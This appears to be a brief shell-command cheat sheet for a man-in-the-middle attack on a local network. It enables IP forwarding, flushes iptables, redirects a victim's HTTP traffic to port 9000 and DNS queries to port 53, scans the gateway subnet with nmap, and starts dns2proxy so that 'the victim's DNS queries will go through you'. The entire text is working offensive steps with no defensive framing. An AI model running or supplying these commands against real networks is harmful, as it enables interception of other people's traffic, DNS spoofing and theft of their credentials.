# enable ip forwarding
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables --flush && iptables --flush -t nat

# set up routing tables to forward necessary packets
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
ifconfig && route -n

# use nmap to determine what ports are open that you can listen to
# if you have access to the victim, ifconfig on linux or ipconfig on windows can be used instead
nmap -sS -O <Gateway IP>/24 

# start dns2proxy so that the victim's DNS queries will go through you
cd Downloads/dns2proxy-master
python dns2proxy.py
